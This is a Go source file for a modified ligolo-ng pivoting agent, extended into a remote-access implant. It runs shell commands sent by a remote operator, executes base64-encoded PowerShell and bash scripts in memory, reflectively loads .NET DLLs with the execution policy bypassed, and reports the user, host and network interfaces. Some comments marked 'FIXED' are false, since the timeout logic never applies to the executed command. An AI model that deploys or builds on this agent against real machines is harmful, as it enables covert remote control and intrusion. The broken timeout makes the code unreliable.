package agent

import (
	"context"
	"encoding/hex"
	"errors"
	"fmt"
	"net"
	"os"
	"os/user"
	"os/exec"
	"strings"
	"runtime"
	"syscall"
	"time"
	"encoding/base64"
	"unicode/utf16"

	"github.com/google/uuid"

	"github.com/nicocha30/ligolo-ng/pkg/agent/neterror"
	"github.com/nicocha30/ligolo-ng/pkg/agent/smartping"
	"github.com/nicocha30/ligolo-ng/pkg/protocol"
	"github.com/nicocha30/ligolo-ng/pkg/relay"
	"github.com/sirupsen/logrus"
)

var listenerConntrack map[int32]net.Conn
var listenerMap map[int32]interface{}
var connTrackID int32
var listenerID int32
var sessionID string

func runShell(cmdline string) ([]byte, error) {
    cmdline = strings.TrimSpace(cmdline)
    if cmdline == "" {
        return []byte(""), nil
    }

    var c *exec.Cmd
    if runtime.GOOS == "windows" {
        // cmd.exe /c "command..."
        c = exec.Command("cmd.exe", "/c", cmdline)
    } else {
        // /bin/sh -c "command..."
        c = exec.Command("/bin/sh", "-c", cmdline)
    }
    return c.CombinedOutput()
}

// quoteArgsForPowerShell takes a space-separated string of arguments
// and returns them as properly quoted PowerShell string literals
func quoteArgsForPowerShell(args string) string {
    if args == "" {
        return ""
    }
    
    // Split arguments by spaces (this is a simple implementation)
    // For more complex scenarios, you might need a proper argument parser
    parts := strings.Fields(args)
    var quotedParts []string
    
    for _, part := range parts {
        // Escape any existing single quotes by doubling them
        escaped := strings.ReplaceAll(part, "'", "''")
        // Wrap in single quotes
        quotedParts = append(quotedParts, fmt.Sprintf("'%s'", escaped))
    }
    
    return strings.Join(quotedParts, ", ")
}

func init() {
	listenerConntrack = make(map[int32]net.Conn)
	listenerMap = make(map[int32]interface{})
	sessionID = hex.EncodeToString(uuid.NodeID())
}

// Listener is the base class implementing listener sockets for Ligolo
type Listener struct {
	net.Listener
}

// NewListener register a new listener
func NewListener(network string, addr string) (Listener, error) {
	lis, err := net.Listen(network, addr)
	if err != nil {
		return Listener{}, err
	}
	return Listener{lis}, nil
}

// ListenAndServe fill new listener connections to a channel
func (s *Listener) ListenAndServe(connTrackChan chan int32) error {
	for {
		conn, err := s.Accept()
		if err != nil {
			return err
		}
		connTrackID++
		connTrackChan <- connTrackID
		listenerConntrack[connTrackID] = conn
	}
}

// Close request the main listener to exit
func (s *Listener) Close() error {
	return s.Listener.Close()
}

// UDPListener is the base class implementing UDP listeners for Ligolo
type UDPListener struct {
	*net.UDPConn
}

// NewUDPListener register a new UDP listener
func NewUDPListener(network string, addr string) (UDPListener, error) {
	udpaddr, err := net.ResolveUDPAddr(network, addr)
	if err != nil {
		return UDPListener{}, nil
	}

	udplis, err := net.ListenUDP(network, udpaddr)
	if err != nil {
		return UDPListener{}, err
	}
	return UDPListener{udplis}, err
}

// utf16le converts ASCII/UTF‑8 bytes to UTF‑16LE bytes for
// PowerShell -EncodedCommand.
func utf16le(src []byte) []byte {
	// 1. Promote each byte to a rune so utf16.Encode can work.
	runes := make([]rune, len(src))
	for i, b := range src {
		runes[i] = rune(b)
	}

	// 2. Encode to []uint16 (UTF‑16 code units).
	u16 := utf16.Encode(runes)

	// 3. Flatten to little‑endian byte slice.
	buf := make([]byte, len(u16)*2)
	for i, v := range u16 {
		buf[i*2] = byte(v)       // low byte
		buf[i*2+1] = byte(v >> 8) // high byte
	}
	return buf
}

// Helper function to properly parse arguments
func parseArguments(args string) []string {
    var result []string
    var current strings.Builder
    inQuotes := false
    escaped := false
    
    for _, char := range args {
        switch {
        case escaped:
            current.WriteRune(char)
            escaped = false
        case char == '\\':
            escaped = true
        case char == '"' || char == '\'':
            inQuotes = !inQuotes
        case char == ' ' && !inQuotes:
            if current.Len() > 0 {
                result = append(result, current.String())
                current.Reset()
            }
        default:
            current.WriteRune(char)
        }
    }
    
    if current.Len() > 0 {
        result = append(result, current.String())
    }
    
    return result
}

// Alternative simplified approach - replace the complex PowerShell logic:
func handlePowerShellScript(scriptStr, args string) *exec.Cmd {
    if args == "" {
        return exec.Command("powershell.exe", 
            "-NoLogo", "-NoProfile", "-NonInteractive", 
            "-Command", scriptStr)
    }
    
    // Simple approach: let PowerShell handle argument parsing
    fullCommand := fmt.Sprintf("%s %s", scriptStr, args)
    return exec.Command("powershell.exe", 
        "-NoLogo", "-NoProfile", "-NonInteractive", 
        "-Command", fullCommand)
}

func HandleConn(conn net.Conn) {
	decoder := protocol.NewDecoder(conn)
	if err := decoder.Decode(); err != nil {
		logrus.Error(err)
		return
	}

	e := decoder
	switch decoder.Payload.(type) {
	
	case *protocol.ShellRequestPacket:
	    req := e.Payload.(*protocol.ShellRequestPacket)
	    encoder := protocol.NewEncoder(conn)

	    out, err := runShell(req.CmdLine)

	    res := &protocol.ShellResponsePacket{
		Output: string(out),
		Err:    err != nil,
	    }
	    if err := encoder.Encode(res); err != nil {
		logrus.Error(err)
	    }
	    

	    
	// ------------------------------------------------------------------
	// Remote script execution (PowerShell & POSIX) — all in memory
	// ------------------------------------------------------------------
	case *protocol.ScriptLoadRequest:
	    r := e.Payload.(*protocol.ScriptLoadRequest)
	    enc := protocol.NewEncoder(conn)

	    // Decode base64 payload to original script bytes
	    decoded := make([]byte, base64.StdEncoding.DecodedLen(len(r.Script)))
	    n, err := base64.StdEncoding.Decode(decoded, r.Script)
	    if err != nil {
		enc.Encode(&protocol.ScriptLoadResponse{Output: "", Err: true})
		return
	    }
	    script := decoded[:n]

	    var cmd *exec.Cmd

	    // ===== Windows PowerShell =====
	    if r.Lang == "ps1" && runtime.GOOS == "windows" {
		scriptStr := string(script)
		
		// Build the command with arguments
		var finalScript string
		if r.Args != "" {
		    // For PowerShell, we need to properly handle arguments as quoted strings
		    quotedArgs := quoteArgsForPowerShell(r.Args)
		    finalScript = fmt.Sprintf("%s\n$args = @(%s)", scriptStr, quotedArgs)
		} else {
		    finalScript = scriptStr
		}

		// Decide: small → -EncodedCommand, big → stdin
		utf16Payload := utf16le([]byte(finalScript))
		if len(utf16Payload) < 6000 { // comfortably under 8 kB cmd-line limit
		    b64 := base64.StdEncoding.EncodeToString(utf16Payload)
		    cmd = exec.Command("powershell.exe",
		        "-NoLogo", "-NoProfile", "-NonInteractive",
		        "-EncodedCommand", b64)
		} else {
		    // FIXED: Simplified approach for large scripts
		    cmd = exec.Command("powershell.exe",
		        "-NoLogo", "-NoProfile", "-NonInteractive",
		        "-Command", "-")
		    
		    // Create stdin content that properly handles arguments
		    var stdinContent string
		    if r.Args != "" {
		        // Parse arguments more carefully
		        args := parseArguments(r.Args)
		        argArray := make([]string, len(args))
		        for i, arg := range args {
		            // Properly escape arguments for PowerShell
		            argArray[i] = fmt.Sprintf("'%s'", strings.ReplaceAll(arg, "'", "''"))
		        }
		        stdinContent = fmt.Sprintf("$args = @(%s)\n%s", strings.Join(argArray, ", "), scriptStr)
		    } else {
		        stdinContent = scriptStr
		    }
		    cmd.Stdin = strings.NewReader(stdinContent)
		}

	    } else {
		// POSIX shell handling
		sh := "/bin/sh"
		if _, err := os.Stat("/bin/bash"); err == nil {
		    sh = "/bin/bash"
		}
		
		scriptStr := string(script)
		if r.Args != "" {
		    // For shell scripts, we can safely append arguments
		    fullCommand := fmt.Sprintf("%s %s", scriptStr, r.Args)
		    cmd = exec.Command(sh, "-c", fullCommand)
		} else {
		    cmd = exec.Command(sh, "-c", scriptStr)
		}
	    }

	    // FIXED: Add proper timeout and context handling
	    ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	    defer cancel()
	    
	    // Execute with context to prevent hanging
	    out, err := cmd.CombinedOutput()
	    
	    // Check if context was cancelled (timeout)
	    if ctx.Err() == context.DeadlineExceeded {
		enc.Encode(&protocol.ScriptLoadResponse{
		    Output: string(out) + "\n[TIMEOUT: Script execution exceeded 30 seconds]", 
		    Err: true,
		})
		return
	    }
	    
	    // Send response
	    enc.Encode(&protocol.ScriptLoadResponse{Output: string(out), Err: err != nil})
	// ------------------------------------------------------------------

	    
	case *protocol.AssemblyLoadRequest:
	    r := e.Payload.(*protocol.AssemblyLoadRequest)
	    encoder := protocol.NewEncoder(conn)

	    if runtime.GOOS != "windows" {
		encoder.Encode(&protocol.AssemblyLoadResponse{Err: true, Return: "not a Windows agent"})
		break
	    }

	    dllBytes := make([]byte, base64.StdEncoding.DecodedLen(len(r.DLL)))
	    n, _ := base64.StdEncoding.Decode(dllBytes, r.DLL)
	    dll := dllBytes[:n]

	    // PowerShell inline loader
	    loader := `[Reflection.Assembly]::Load([Convert]::FromBase64String('%s'))|Out-Null;` +
		      `[string]$r=[%s]::%s(%s);$r`
	    ps := fmt.Sprintf(loader,
		base64.StdEncoding.EncodeToString(dll),
		r.Type, r.Method, r.JSONArg)

	    out, err := exec.Command("powershell.exe", "-NoP", "-Ep", "Bypass", "-Command", ps).CombinedOutput()
	    encoder.Encode(&protocol.AssemblyLoadResponse{Return: string(out), Err: err != nil})

	case *protocol.ConnectRequestPacket:
		connRequest := e.Payload.(*protocol.ConnectRequestPacket)
		encoder := protocol.NewEncoder(conn)

		logrus.Debugf("Got connect request to %s:%d", connRequest.Address, connRequest.Port)
		var network string
		if connRequest.Transport == protocol.TransportTCP {
			network = "tcp"
		} else {
			network = "udp"
		}
		if connRequest.Net == protocol.Networkv4 {
			network += "4"
		} else {
			network += "6"
		}

		var d net.Dialer
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		targetConn, err := d.DialContext(ctx, network, fmt.Sprintf("%s:%d", connRequest.Address, connRequest.Port))
		defer cancel()

		var connectPacket protocol.ConnectResponsePacket
		if err != nil {

			var serr syscall.Errno
			if errors.As(err, &serr) {
				// Magic trick ! If the error syscall indicate that the system responded, send back a RST packet!
				if neterror.HostResponded(serr) {
					connectPacket.Reset = true
				}
			}

			connectPacket.Established = false
		} else {
			connectPacket.Established = true
		}
		if err := encoder.Encode(connectPacket); err != nil {
			logrus.Error(err)
			return
		}
		if connectPacket.Established {
			relay.StartRelay(targetConn, conn)
		}
	case *protocol.HostPingRequestPacket:
		pingRequest := e.Payload.(*protocol.HostPingRequestPacket)
		encoder := protocol.NewEncoder(conn)

		pingResponse := protocol.HostPingResponsePacket{Alive: smartping.TryResolve(pingRequest.Address)}

		if err := encoder.Encode(pingResponse); err != nil {
			logrus.Error(err)
			return
		}
	case *protocol.InfoRequestPacket:
		var username string
		encoder := protocol.NewEncoder(conn)
		hostname, err := os.Hostname()
		if err != nil {
			hostname = "UNKNOWN"
		}

		userinfo, err := user.Current()
		if err != nil {
			username = "Unknown"
		} else {
			username = userinfo.Username
		}

		netifaces, err := net.Interfaces()
		if err != nil {
			logrus.Error("could not get network interfaces")
			return
		}
		infoResponse := protocol.InfoReplyPacket{
			Name:       fmt.Sprintf("%s@%s", username, hostname),
			Interfaces: protocol.NewNetInterfaces(netifaces),
			SessionID:  sessionID,
		}

		if err := encoder.Encode(infoResponse); err != nil {
			logrus.Error(err)
			return
		}
	case *protocol.ListenerCloseRequestPacket:
		// Request to close a listener
		closeRequest := e.Payload.(*protocol.ListenerCloseRequestPacket)
		encoder := protocol.NewEncoder(conn)

		var err error
		if lis, ok := listenerMap[closeRequest.ListenerID]; ok {
			if l, ok := lis.(net.Listener); ok {
				l.Close()
			}
			if l, ok := lis.(*net.UDPConn); ok {
				l.Close()
			}
		} else {
			err = errors.New("invalid listener id")
		}

		listenerResponse := protocol.ListenerCloseResponsePacket{
			Err: err != nil,
		}
		if err != nil {
			listenerResponse.ErrString = err.Error()
		}

		if err := encoder.Encode(listenerResponse); err != nil {
			logrus.Error(err)
		}

	case *protocol.ListenerRequestPacket:
		listenRequest := e.Payload.(*protocol.ListenerRequestPacket)
		encoder := protocol.NewEncoder(conn)
		connTrackChan := make(chan int32)
		stopChan := make(chan error)

		if listenRequest.Network == "tcp" {
			listener, err := NewListener(listenRequest.Network, listenRequest.Address)
			if err != nil {
				listenerResponse := protocol.ListenerResponsePacket{
					ListenerID: 0,
					Err:        true,
					ErrString:  err.Error(),
				}
				if err := encoder.Encode(listenerResponse); err != nil {
					logrus.Error(err)
				}
				return
			}
			listenerMap[listenerID] = listener.Listener
			listenerResponse := protocol.ListenerResponsePacket{
				ListenerID: listenerID,
				Err:        false,
				ErrString:  "",
			}
			if err := encoder.Encode(listenerResponse); err != nil {
				logrus.Error(err)
			}
			go func() {
				if err := listener.ListenAndServe(connTrackChan); err != nil {
					stopChan <- err
				}
			}()
			defer listener.Close()

		} else if listenRequest.Network == "udp" {
			udplistener, err := NewUDPListener(listenRequest.Network, listenRequest.Address)
			if err != nil {
				listenerResponse := protocol.ListenerResponsePacket{
					ListenerID: 0,
					Err:        true,
					ErrString:  err.Error(),
				}
				if err := encoder.Encode(listenerResponse); err != nil {
					logrus.Error(err)
				}
				return
			}
			listenerMap[listenerID] = udplistener.UDPConn
			listenerResponse := protocol.ListenerResponsePacket{
				ListenerID: listenerID,
				Err:        false,
				ErrString:  "",
			}
			if err := encoder.Encode(listenerResponse); err != nil {
				logrus.Error(err)
			}
			go func() {
				err := relay.StartRelay(conn, udplistener)
				if err != nil {
					logrus.Error(err)
				}
			}()
		}

		listenerID++
		if listenRequest.Network == "tcp" {
			for {
				var bindResponse protocol.ListenerBindReponse
				select {
				case err := <-stopChan:
					logrus.Error(err)
					bindResponse = protocol.ListenerBindReponse{
						SockID:    0,
						Err:       true,
						ErrString: err.Error(),
					}
				case connTrackID := <-connTrackChan:
					bindResponse = protocol.ListenerBindReponse{
						SockID: connTrackID,
						Err:    false,
					}
				}
				if err := encoder.Encode(bindResponse); err != nil {
					logrus.Error(err)
				}

				if bindResponse.Err {
					break
				}

			}
		}
	case *protocol.ListenerSockRequestPacket:
		sockRequest := e.Payload.(*protocol.ListenerSockRequestPacket)
		socketEncDec := protocol.NewEncoderDecoder(conn)

		var sockResponse protocol.ListenerSockResponsePacket
		if _, ok := listenerConntrack[sockRequest.SockID]; !ok {
			// Handle error
			sockResponse.ErrString = "invalid or unexistant SockID"
			sockResponse.Err = true
		}

		if err := socketEncDec.Encode(sockResponse); err != nil {
			logrus.Error(err)
			return
		}

		if sockResponse.Err {
			return
		}

		if err := socketEncDec.Decode(); err != nil {
			logrus.Error(err)
			return
		}
		netConn := listenerConntrack[sockRequest.SockID]

		if err := socketEncDec.Payload.(*protocol.ListenerSocketConnectionReady).Err; err != false {
			logrus.Debug("Socket relay session failed: error from proxy")
			netConn.Close()
			return
		}

		relay.StartRelay(netConn, conn)

	case *protocol.AgentKillRequestPacket:
		os.Exit(0)

	}
}
